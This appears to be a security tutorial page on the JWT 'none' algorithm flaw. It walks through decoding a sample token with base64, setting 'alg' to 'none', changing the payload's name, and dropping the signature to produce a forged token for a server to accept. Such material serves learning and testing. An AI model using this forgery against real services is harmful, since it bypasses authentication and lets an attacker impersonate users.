# JWT flaw

JWT is ...



## None Algorithm

A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. As we have seen, JWT implements a signature to validate the integrity of the payload data. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:

1. Modify the header section of the token so that the `alg` header would contain the value `none`.
2. Remove the signature part.\


{% embed url="https://www.gavinjl.me/edit-jwt-online-alg-none/" %}

### Change JWT alg in linux machine

Start with the encoded token:

{% code overflow="wrap" %}
```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```
{% endcode %}

Split the encoded token into segments delimited by the "." character.

\
The first block is the header, decode that:

```bash
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d
```

Here, the result is:

```
{"alg":"HS256","typ":"JWT"}
```

You can manually edit this and alter the algorithm, here we're changing it to "none". Once changed we can base64 encode it again to become useable:

```bash
echo -n '{"alg":"none","typ":"JWT"}' | base64
```

The result of that is :

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=
```

{% hint style="info" %}
IMPORTANT: Remove the trailing "=" before we use it to replace the first part of the JWT.
{% endhint %}

Follow the same process to edit the JWT payload (second encoded block).

{% code overflow="wrap" %}
```bash
echo 'eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ' | base64 -d
```
{% endcode %}

Result:

```json
{"sub":"1234567890","name":"John Doe","iat":1516239022}
```

We'll edit the name from John Doe to be Jane Doe and encode it:

```bash
echo -n '{"sub":"1234567890","name":"Jane Doe","iat":1516239022}' | base64
```

Result:

```
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkphbmUgRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ==
```

If we're setting the algorithm to "none" then we don't want a signature. The format we'll get is:

```
{encoded header}.{encoded payload}.
```

Note the "." on the end. This would normally have the signature after it but because we're saying the algorithm is none then no signature is needed.

Our example becomes:

{% code overflow="wrap" %}
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkphbmUgRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
```
{% endcode %}

We've successfully edited a JWT and can test to see if the server accepts the edited version.

\




